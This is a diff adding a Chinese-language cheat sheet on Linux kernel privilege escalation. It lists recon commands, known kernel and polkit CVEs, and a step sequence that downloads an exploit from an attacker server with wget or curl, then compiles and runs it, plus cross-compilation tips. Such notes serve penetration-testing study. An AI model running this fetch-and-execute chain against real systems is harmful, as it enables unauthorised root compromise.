@@ -1,0 +1,48 @@
+# Linux 内核漏洞提权
+
+## 信息收集
+```bash
+uname -a
+cat /etc/os-release
+lsb_release -a
+
+# 查找可用 exploit
+searchsploit "linux kernel $(uname -r | cut -d'-' -f1)"
+```
+
+## 常见内核漏洞
+```bash
+# CVE-2016-5195 (DirtyCow) — Linux 2.6.22-4.8
+# CVE-2021-4034 (PwnKit) — polkit pkexec
+# CVE-2022-0847 (DirtyPipe) — Linux 5.8-5.16
+# CVE-2023-0386 (OverlayFS)
+# CVE-2023-2640 (Ubuntu OverlayFS)
+# CVE-2024-1086 (Netfilter nf_tables)
+```
+
+## 利用步骤
+```bash
+# 1. 上传 exploit
+wget http://vps/exploit.c
+curl -O http://vps/exploit.c
+
+# 2. 编译
+gcc -o exploit exploit.c
+cc exploit.c -o exploit
+
+# 3. 执行
+chmod +x exploit
+./exploit
+```
+
+## 注意事项
+```bash
+# 编译环境
+apt update && apt install -y gcc make
+
+# 静态编译（目标无gcc时本地编译）
+gcc -static -o exploit exploit.c
+
+# 交叉编译（ARM/MIPS 平台）
+aarch64-linux-gnu-gcc -static -o exploit exploit.c
+```
